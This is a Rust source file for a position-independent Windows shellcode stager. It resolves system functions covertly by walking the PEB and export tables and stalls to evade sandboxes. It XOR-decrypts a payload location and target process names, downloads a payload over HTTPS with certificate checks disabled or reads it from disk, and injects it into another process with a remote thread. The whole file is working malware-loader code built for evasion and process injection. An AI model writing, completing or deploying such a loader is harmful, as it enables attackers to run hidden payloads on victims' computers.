//! Position-independent shellcode stager (x86-64 only).
//!
//! All Win32 APIs are resolved at runtime via PEB + export-table walking.
//! No IAT, no windows-sys — pure PIC after /MERGE:.rdata=.text.
//! The generator extracts the .text section and prepends a JMP stub so
//! execution always starts at the entry function regardless of LTO layout.

#![no_std]
#![no_main]
#![allow(non_snake_case, non_camel_case_types, dead_code, unsafe_op_in_unsafe_fn)]

#[cfg(not(target_arch = "x86_64"))]
compile_error!("shellcode format only supports x86-64");

#[cfg(not(any(feature = "local", feature = "url", feature = "embed")))]
compile_error!("enable exactly one source feature: local, url, or embed");

include!(concat!(env!("OUT_DIR"), "/stager_consts.rs"));

use core::ffi::c_void;
use core::ptr::{null, null_mut};

// ── Panic handler ─────────────────────────────────────────────────────────────

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    unsafe { core::arch::asm!("ud2", options(noreturn)) }
}

// ── Memory intrinsics ─────────────────────────────────────────────────────────

#[unsafe(no_mangle)]
unsafe extern "C" fn memcmp(a: *const u8, b: *const u8, n: usize) -> i32 {
    for i in 0..n {
        let x = *a.add(i);
        let y = *b.add(i);
        if x != y { return x as i32 - y as i32; }
    }
    0
}

#[unsafe(no_mangle)]
unsafe extern "C" fn memcpy(dst: *mut u8, src: *const u8, n: usize) -> *mut u8 {
    for i in 0..n { *dst.add(i) = *src.add(i); }
    dst
}

#[unsafe(no_mangle)]
unsafe extern "C" fn memmove(dst: *mut u8, src: *const u8, n: usize) -> *mut u8 {
    if (dst as usize) < (src as usize) {
        for i in 0..n { *dst.add(i) = *src.add(i); }
    } else {
        let mut i = n;
        while i > 0 { i -= 1; *dst.add(i) = *src.add(i); }
    }
    dst
}

#[unsafe(no_mangle)]
unsafe extern "C" fn memset(dst: *mut u8, val: i32, n: usize) -> *mut u8 {
    for i in 0..n { *dst.add(i) = val as u8; }
    dst
}

// ── Windows types (manual - no windows-sys) ────────────────────────────────

type HANDLE = *mut c_void;
type DWORD  = u32;
type BOOL   = i32;
type SIZE_T = usize;

#[repr(C)]
struct PROCESSENTRY32W {
    dwSize:              u32,
    cntUsage:            u32,
    th32ProcessID:       u32,
    th32DefaultHeapID:   usize,
    th32ModuleID:        u32,
    cntThreads:          u32,
    th32ParentProcessID: u32,
    pcPriClassBase:      i32,
    dwFlags:             u32,
    szExeFile:           [u16; 260],
}

// ── Function-pointer types ────────────────────────────────────────────────────

type FnGetTickCount64        = unsafe extern "system" fn() -> u64;
type FnVirtualAlloc          = unsafe extern "system" fn(*mut c_void, SIZE_T, DWORD, DWORD) -> *mut c_void;
type FnVirtualFree           = unsafe extern "system" fn(*mut c_void, SIZE_T, DWORD) -> BOOL;
type FnVirtualAllocEx        = unsafe extern "system" fn(HANDLE, *mut c_void, SIZE_T, DWORD, DWORD) -> *mut c_void;
type FnWriteProcessMemory    = unsafe extern "system" fn(HANDLE, *mut c_void, *const c_void, SIZE_T, *mut SIZE_T) -> BOOL;
type FnVirtualProtectEx      = unsafe extern "system" fn(HANDLE, *mut c_void, SIZE_T, DWORD, *mut DWORD) -> BOOL;
type FnCreateRemoteThread    = unsafe extern "system" fn(HANDLE, *const c_void, SIZE_T, *mut c_void, *mut c_void, DWORD, *mut DWORD) -> HANDLE;
type FnOpenProcess           = unsafe extern "system" fn(DWORD, BOOL, DWORD) -> HANDLE;
type FnCloseHandle           = unsafe extern "system" fn(HANDLE) -> BOOL;
type FnCreateToolhelp32Snapshot = unsafe extern "system" fn(DWORD, DWORD) -> HANDLE;
type FnProcess32FirstW       = unsafe extern "system" fn(HANDLE, *mut PROCESSENTRY32W) -> BOOL;
type FnProcess32NextW        = unsafe extern "system" fn(HANDLE, *mut PROCESSENTRY32W) -> BOOL;
type FnGetProcAddress        = unsafe extern "system" fn(*mut c_void, *const u8) -> *mut c_void;

#[cfg(feature = "url")]
type FnLoadLibraryA          = unsafe extern "system" fn(*const u8) -> *mut c_void;

#[cfg(feature = "url")]
type FnWinHttpOpen           = unsafe extern "system" fn(*const u16, DWORD, *const u16, *const u16, DWORD) -> HANDLE;
#[cfg(feature = "url")]
type FnWinHttpConnect        = unsafe extern "system" fn(HANDLE, *const u16, u16, DWORD) -> HANDLE;
#[cfg(feature = "url")]
type FnWinHttpOpenRequest    = unsafe extern "system" fn(HANDLE, *const u16, *const u16, *const u16, *const u16, *const *const u16, DWORD) -> HANDLE;
#[cfg(feature = "url")]
type FnWinHttpSendRequest    = unsafe extern "system" fn(HANDLE, *const u16, DWORD, *const c_void, DWORD, DWORD, usize) -> BOOL;
#[cfg(feature = "url")]
type FnWinHttpReceiveResponse = unsafe extern "system" fn(HANDLE, *mut c_void) -> BOOL;
#[cfg(feature = "url")]
type FnWinHttpReadData       = unsafe extern "system" fn(HANDLE, *mut c_void, DWORD, *mut DWORD) -> BOOL;
#[cfg(feature = "url")]
type FnWinHttpSetOption      = unsafe extern "system" fn(HANDLE, DWORD, *mut c_void, DWORD) -> BOOL;
#[cfg(feature = "url")]
type FnWinHttpCloseHandle    = unsafe extern "system" fn(HANDLE) -> BOOL;

#[cfg(feature = "local")]
type FnCreateFileW           = unsafe extern "system" fn(*const u16, DWORD, DWORD, *const c_void, DWORD, DWORD, HANDLE) -> HANDLE;
#[cfg(feature = "local")]
type FnGetFileSizeEx         = unsafe extern "system" fn(HANDLE, *mut i64) -> BOOL;
#[cfg(feature = "local")]
type FnReadFile              = unsafe extern "system" fn(HANDLE, *mut c_void, DWORD, *mut DWORD, *mut c_void) -> BOOL;

// ── Resolved API bundle ───────────────────────────────────────────────────────

struct Apis {
    tick64:               FnGetTickCount64,
    virtual_alloc:        FnVirtualAlloc,
    virtual_free:         FnVirtualFree,
    virtual_alloc_ex:     FnVirtualAllocEx,
    write_proc_mem:       FnWriteProcessMemory,
    virtual_protect_ex:   FnVirtualProtectEx,
    create_remote_thread: FnCreateRemoteThread,
    open_process:         FnOpenProcess,
    close_handle:         FnCloseHandle,
    snapshot:             FnCreateToolhelp32Snapshot,
    proc32_first:         FnProcess32FirstW,
    proc32_next:          FnProcess32NextW,
    #[cfg(feature = "url")]
    wh_open:              FnWinHttpOpen,
    #[cfg(feature = "url")]
    wh_connect:           FnWinHttpConnect,
    #[cfg(feature = "url")]
    wh_open_request:      FnWinHttpOpenRequest,
    #[cfg(feature = "url")]
    wh_send_request:      FnWinHttpSendRequest,
    #[cfg(feature = "url")]
    wh_recv_response:     FnWinHttpReceiveResponse,
    #[cfg(feature = "url")]
    wh_read_data:         FnWinHttpReadData,
    #[cfg(feature = "url")]
    wh_set_option:        FnWinHttpSetOption,
    #[cfg(feature = "url")]
    wh_close:             FnWinHttpCloseHandle,
    #[cfg(feature = "local")]
    create_file_w:        FnCreateFileW,
    #[cfg(feature = "local")]
    get_file_size_ex:     FnGetFileSizeEx,
    #[cfg(feature = "local")]
    read_file:            FnReadFile,
}

// ── String helpers ────────────────────────────────────────────────────────────

unsafe fn cstr_eq(ptr: *const u8, name: &[u8]) -> bool {
    for (i, &b) in name.iter().enumerate() {
        if *ptr.add(i) != b { return false; }
    }
    true
}

unsafe fn wide_ieq(w: *const u16, wlen: usize, a: &[u8]) -> bool {
    if wlen != a.len() { return false; }
    for (i, &b) in a.iter().enumerate() {
        let c = *w.add(i);
        let bl = if b.is_ascii_uppercase() { b | 0x20 } else { b };
        let wl = if c >= b'A' as u16 && c <= b'Z' as u16 { c | 0x20 } else { c };
        if bl as u16 != wl { return false; }
    }
    true
}

fn ascii_to_wide(src: &[u8], dst: &mut [u16]) -> usize {
    let n = src.len().min(dst.len().saturating_sub(1));
    for i in 0..n { dst[i] = src[i] as u16; }
    if n < dst.len() { dst[n] = 0; }
    n
}

// ── PEB walking ───────────────────────────────────────────────────────────────

unsafe fn peb_find_kernel32() -> *mut u8 {
    let peb: usize;
    core::arch::asm!(
        "mov {}, gs:[0x60]",
        out(reg) peb,
        options(nostack, preserves_flags),
    );
    let peb = peb as *const u8;
    // PEB.Ldr at PEB+0x18
    let ldr = *(peb.add(0x18) as *const *const u8);
    // PEB_LDR_DATA.InMemoryOrderModuleList.Flink at Ldr+0x20
    let head = ldr.add(0x20) as *const *mut u8;
    let mut cur = *head;
    while cur as *const _ != head {
        // cur = &LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks (at struct offset 0x10)
        // DllBase        = entry + (0x030 - 0x010) = entry + 0x020
        // BaseDllName.Length  = entry + (0x058 - 0x010) = entry + 0x048
        // BaseDllName.Buffer  = entry + (0x060 - 0x010) = entry + 0x050
        let base = *(cur.add(0x20) as *const *mut u8);
        let nlen = *(cur.add(0x48) as *const u16) as usize / 2;
        let nbuf = *(cur.add(0x50) as *const *const u16);
        if wide_ieq(nbuf, nlen, b"kernel32.dll") {
            return base;
        }
        cur = *(cur as *const *mut u8);
    }
    null_mut()
}

unsafe fn get_export(dll_base: *mut u8, name: &[u8]) -> *mut u8 {
    let e_lfanew = *(dll_base.add(0x3c) as *const u32) as usize;
    let nt = dll_base.add(e_lfanew);
    // DataDirectory[0] (export) RVA is at NT+0x88 for PE64 optional header
    let exp_rva = *(nt.add(0x88) as *const u32) as usize;
    if exp_rva == 0 { return null_mut(); }
    let exp = dll_base.add(exp_rva);
    let n_names  = *(exp.add(0x18) as *const u32) as usize;
    let fn_arr   = dll_base.add(*(exp.add(0x1c) as *const u32) as usize) as *const u32;
    let name_arr = dll_base.add(*(exp.add(0x20) as *const u32) as usize) as *const u32;
    let ord_arr  = dll_base.add(*(exp.add(0x24) as *const u32) as usize) as *const u16;
    for i in 0..n_names {
        let name_rva = *name_arr.add(i) as usize;
        if cstr_eq(dll_base.add(name_rva), name) {
            let ord    = *ord_arr.add(i) as usize;
            let fn_rva = *fn_arr.add(ord) as usize;
            return dll_base.add(fn_rva);
        }
    }
    null_mut()
}

// ── API resolution ────────────────────────────────────────────────────────────

unsafe fn resolve_apis() -> Option<Apis> {
    let k32 = peb_find_kernel32();
    if k32.is_null() { return None; }

    let raw_gpa = get_export(k32, b"GetProcAddress\0");
    if raw_gpa.is_null() { return None; }
    let gpa: FnGetProcAddress = core::mem::transmute(raw_gpa);

    // Looks up a function by name in the given DLL via GetProcAddress.
    // Returns None from resolve_apis() if not found.
    macro_rules! f {
        ($dll:expr, $name:literal) => {{
            let ptr = (gpa)($dll as *mut c_void, concat!($name, "\0").as_bytes().as_ptr());
            if ptr.is_null() { return None; }
            core::mem::transmute(ptr)
        }};
    }

    #[cfg(feature = "url")]
    let wh = {
        let load_lib: FnLoadLibraryA = f!(k32, "LoadLibraryA");
        let h = (load_lib)(b"winhttp.dll\0".as_ptr());
        if h.is_null() { return None; }
        h
    };

    Some(Apis {
        tick64:               f!(k32, "GetTickCount64"),
        virtual_alloc:        f!(k32, "VirtualAlloc"),
        virtual_free:         f!(k32, "VirtualFree"),
        virtual_alloc_ex:     f!(k32, "VirtualAllocEx"),
        write_proc_mem:       f!(k32, "WriteProcessMemory"),
        virtual_protect_ex:   f!(k32, "VirtualProtectEx"),
        create_remote_thread: f!(k32, "CreateRemoteThread"),
        open_process:         f!(k32, "OpenProcess"),
        close_handle:         f!(k32, "CloseHandle"),
        snapshot:             f!(k32, "CreateToolhelp32Snapshot"),
        proc32_first:         f!(k32, "Process32FirstW"),
        proc32_next:          f!(k32, "Process32NextW"),
        #[cfg(feature = "url")]
        wh_open:              f!(wh, "WinHttpOpen"),
        #[cfg(feature = "url")]
        wh_connect:           f!(wh, "WinHttpConnect"),
        #[cfg(feature = "url")]
        wh_open_request:      f!(wh, "WinHttpOpenRequest"),
        #[cfg(feature = "url")]
        wh_send_request:      f!(wh, "WinHttpSendRequest"),
        #[cfg(feature = "url")]
        wh_recv_response:     f!(wh, "WinHttpReceiveResponse"),
        #[cfg(feature = "url")]
        wh_read_data:         f!(wh, "WinHttpReadData"),
        #[cfg(feature = "url")]
        wh_set_option:        f!(wh, "WinHttpSetOption"),
        #[cfg(feature = "url")]
        wh_close:             f!(wh, "WinHttpCloseHandle"),
        #[cfg(feature = "local")]
        create_file_w:        f!(k32, "CreateFileW"),
        #[cfg(feature = "local")]
        get_file_size_ex:     f!(k32, "GetFileSizeEx"),
        #[cfg(feature = "local")]
        read_file:            f!(k32, "ReadFile"),
    })
}

// ── Anti-sandbox ──────────────────────────────────────────────────────────────

fn anti_sandbox(tick: FnGetTickCount64) -> bool {
    let start = unsafe { tick() };
    let mut x: u64 = SALT;
    for i in 0u64..6_000_000_000 {
        x = x.wrapping_mul(6_364_136_223_846_793_005).wrapping_add(i);
    }
    core::hint::black_box(x);
    unsafe { tick() }.saturating_sub(start) >= 4_000
}

// ── Target decrypt ────────────────────────────────────────────────────────────

#[cfg(any(feature = "url", feature = "local"))]
fn decrypt_target(out: &mut [u8]) -> usize {
    let len = SC_ENC.len().min(out.len());
    for i in 0..len { out[i] = SC_ENC[i] ^ SC_KEY; }
    len
}

fn decrypt_procs(out: &mut [u8]) -> usize {
    let len = PROC_ENC.len().min(out.len());
    for i in 0..len { out[i] = PROC_ENC[i] ^ PROC_KEY; }
    if len < out.len() { out[len] = 0; }
    len
}

// ── URL download ──────────────────────────────────────────────────────────────

#[cfg(feature = "url")]
fn parse_port(s: &[u8]) -> Option<u16> {
    let mut n = 0u32;
    for &b in s {
        if b < b'0' || b > b'9' { return None; }
        n = n.wrapping_mul(10).wrapping_add((b - b'0') as u32);
        if n > 65535 { return None; }
    }
    Some(n as u16)
}

#[cfg(feature = "url")]
fn parse_url(url: &[u8]) -> Option<(bool, usize, usize, u16, usize)> {
    let (https, rest) = if url.starts_with(b"https://") {
        (true, 8usize)
    } else if url.starts_with(b"http://") {
        (false, 7usize)
    } else {
        return None;
    };
    let auth_end = url[rest..].iter().position(|&b| b == b'/').map_or(url.len(), |i| i + rest);
    let path_start = auth_end;
    let authority = &url[rest..auth_end];
    let (host_start, host_end, port) = if let Some(c) = authority.iter().rposition(|&b| b == b':') {
        let p = parse_port(&authority[c + 1..])?;
        (rest, rest + c, p)
    } else {
        (rest, auth_end, if https { 443u16 } else { 80u16 })
    };
    Some((https, host_start, host_end, port, path_start))
}

#[cfg(feature = "url")]
unsafe fn download(a: &Apis, url: &[u8]) -> Option<(*mut u8, usize)> {
    const MAX_SC: usize = 128 * 1024 * 1024;

    let (https, host_start, host_end, port, path_start) = parse_url(url)?;

    let mut host_w  = [0u16; 256];
    let mut path_w  = [0u16; 512];
    let mut agent_w = [0u16; 128];
    ascii_to_wide(&url[host_start..host_end], &mut host_w);
    if path_start < url.len() {
        ascii_to_wide(&url[path_start..], &mut path_w);
    } else {
        ascii_to_wide(b"/", &mut path_w);
    }
    ascii_to_wide(b"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", &mut agent_w);

    let h_sess = (a.wh_open)(agent_w.as_ptr(), 0, null(), null(), 0);
    if h_sess.is_null() { return None; }

    let h_conn = (a.wh_connect)(h_sess, host_w.as_ptr(), port, 0);
    if h_conn.is_null() { (a.wh_close)(h_sess); return None; }

    let get_w = [b'G' as u16, b'E' as u16, b'T' as u16, 0u16];
    let flags: u32 = if https { 0x0080_0000 } else { 0 };
    let h_req = (a.wh_open_request)(h_conn, get_w.as_ptr(), path_w.as_ptr(), null(), null(), null(), flags);
    if h_req.is_null() {
        (a.wh_close)(h_conn);
        (a.wh_close)(h_sess);
        return None;
    }

    if https {
        let mut sec: u32 = 0x3300; // SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS
        (a.wh_set_option)(h_req, 31, &mut sec as *mut _ as *mut c_void, 4);
    }

    let ok = (a.wh_send_request)(h_req, null(), 0, null(), 0, 0, 0) != 0
          && (a.wh_recv_response)(h_req, null_mut()) != 0;
    if !ok {
        (a.wh_close)(h_req);
        (a.wh_close)(h_conn);
        (a.wh_close)(h_sess);
        return None;
    }

    let sc_buf = (a.virtual_alloc)(null_mut(), MAX_SC, 0x3000, 0x04) as *mut u8;
    if sc_buf.is_null() {
        (a.wh_close)(h_req);
        (a.wh_close)(h_conn);
        (a.wh_close)(h_sess);
        return None;
    }

    let mut total = 0usize;
    loop {
        let chunk = (MAX_SC - total).min(65536) as u32;
        if chunk == 0 { break; }
        let mut read = 0u32;
        // Read directly into the VirtualAlloc'd buffer — no intermediate stack chunk needed.
        if (a.wh_read_data)(h_req, sc_buf.add(total) as *mut c_void, chunk, &mut read) == 0 || read == 0 {
            break;
        }
        total += read as usize;
    }

    (a.wh_close)(h_req);
    (a.wh_close)(h_conn);
    (a.wh_close)(h_sess);

    if total == 0 {
        (a.virtual_free)(sc_buf as *mut c_void, 0, 0x8000);
        return None;
    }
    Some((sc_buf, total))
}

// ── Local file read ───────────────────────────────────────────────────────────

#[cfg(feature = "local")]
unsafe fn read_local(a: &Apis, path: &[u8]) -> Option<(*mut u8, usize)> {
    let mut path_w = [0u16; 512];
    ascii_to_wide(path, &mut path_w);

    // GENERIC_READ=0x80000000, FILE_SHARE_READ=1, OPEN_EXISTING=3
    let hf = (a.create_file_w)(path_w.as_ptr(), 0x8000_0000, 1, null(), 3, 0, null_mut());
    if hf as isize == -1 { return None; }

    let mut size: i64 = 0;
    if (a.get_file_size_ex)(hf, &mut size) == 0 || size <= 0 || size > 128 * 1024 * 1024 {
        (a.close_handle)(hf);
        return None;
    }
    let len = size as usize;

    let buf = (a.virtual_alloc)(null_mut(), len, 0x3000, 0x04) as *mut u8;
    if buf.is_null() { (a.close_handle)(hf); return None; }

    let mut total = 0usize;
    while total < len {
        let chunk = (len - total).min(65536) as u32;
        let mut read = 0u32;
        if (a.read_file)(hf, buf.add(total) as *mut c_void, chunk, &mut read, null_mut()) == 0 || read == 0 {
            break;
        }
        total += read as usize;
    }
    (a.close_handle)(hf);

    if total != len {
        (a.virtual_free)(buf as *mut c_void, 0, 0x8000);
        return None;
    }
    Some((buf, len))
}

// ── Process discovery ─────────────────────────────────────────────────────────

unsafe fn find_pid(a: &Apis, target: &[u8]) -> Option<u32> {
    let snap = (a.snapshot)(0x2, 0); // TH32CS_SNAPPROCESS
    if snap as isize == -1 { return None; }

    let mut entry: PROCESSENTRY32W = core::mem::zeroed();
    entry.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;

    let mut found = None;
    if (a.proc32_first)(snap, &mut entry) != 0 {
        loop {
            let nul = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
            if wide_ieq(entry.szExeFile.as_ptr(), nul, target) {
                found = Some(entry.th32ProcessID);
                break;
            }
            if (a.proc32_next)(snap, &mut entry) == 0 { break; }
        }
    }
    (a.close_handle)(snap);
    found
}

unsafe fn find_target_pid(a: &Apis) -> Option<u32> {
    let mut proc_buf = [0u8; 256];
    let len = decrypt_procs(&mut proc_buf);
    let procs = &proc_buf[..len];
    let mut offset = 0;
    while offset < procs.len() {
        let name_end = procs[offset..].iter().position(|&b| b == 0).unwrap_or(procs.len() - offset);
        let name = &procs[offset..offset + name_end];
        if !name.is_empty() {
            if let Some(pid) = find_pid(a, name) { return Some(pid); }
        }
        offset += name_end + 1;
    }
    None
}

// ── Injection ─────────────────────────────────────────────────────────────────

unsafe fn inject(a: &Apis, pid: u32, sc: *const u8, len: usize) -> bool {
    let hp = (a.open_process)(0x001F_FFFF, 0, pid);
    if hp.is_null() { return false; }

    let remote = (a.virtual_alloc_ex)(hp, null_mut(), len, 0x3000, 0x04); // RW
    if remote.is_null() { (a.close_handle)(hp); return false; }

    let mut written = 0usize;
    if (a.write_proc_mem)(hp, remote, sc as *const c_void, len, &mut written) == 0 || written != len {
        (a.close_handle)(hp);
        return false;
    }

    let mut old = 0u32;
    (a.virtual_protect_ex)(hp, remote, len, 0x40, &mut old); // RWX — needed for self-modifying shellcode

    let ht = (a.create_remote_thread)(hp, null(), 0, remote, null_mut(), 0, null_mut());
    if !ht.is_null() { (a.close_handle)(ht); }
    (a.close_handle)(hp);
    !ht.is_null()
}

// ── Entry point ───────────────────────────────────────────────────────────────

/// Called by CreateRemoteThread or directly as shellcode.
/// Returns normally so the calling thread exits cleanly (no ExitProcess).
#[unsafe(no_mangle)]
pub extern "system" fn entry(_: *mut c_void) -> u32 {
    unsafe {
        let apis = match resolve_apis() {
            Some(a) => a,
            None    => return 1,
        };

        if !anti_sandbox(apis.tick64) { return 1; }

        #[cfg(feature = "url")]
        let (sc_ptr, sc_len) = {
            let mut url_buf = [0u8; 512];
            let url_len = decrypt_target(&mut url_buf);
            match download(&apis, &url_buf[..url_len]) {
                Some(r) => r,
                None    => return 1,
            }
        };

        #[cfg(feature = "embed")]
        let (sc_ptr, sc_len): (*const u8, usize) = {
            // include_bytes! goes into .rodata → merged into .text; fully PIC.
            static PAYLOAD: &[u8] = include_bytes!(concat!(env!("CARGO_MANIFEST_DIR"), "/payload.bin"));
            (PAYLOAD.as_ptr(), PAYLOAD.len())
        };

        #[cfg(feature = "local")]
        let (sc_ptr, sc_len) = {
            let mut path_buf = [0u8; 512];
            let path_len = decrypt_target(&mut path_buf);
            match read_local(&apis, &path_buf[..path_len]) {
                Some(r) => r,
                None    => return 1,
            }
        };

        let pid = match find_target_pid(&apis) {
            Some(p) => p,
            None    => {
                #[cfg(any(feature = "url", feature = "local"))]
                (apis.virtual_free)(sc_ptr as *mut c_void, 0, 0x8000);
                return 1;
            }
        };

        inject(&apis, pid, sc_ptr as *const u8, sc_len);

        #[cfg(any(feature = "url", feature = "local"))]
        (apis.virtual_free)(sc_ptr as *mut c_void, 0, 0x8000);
    }
    0
}
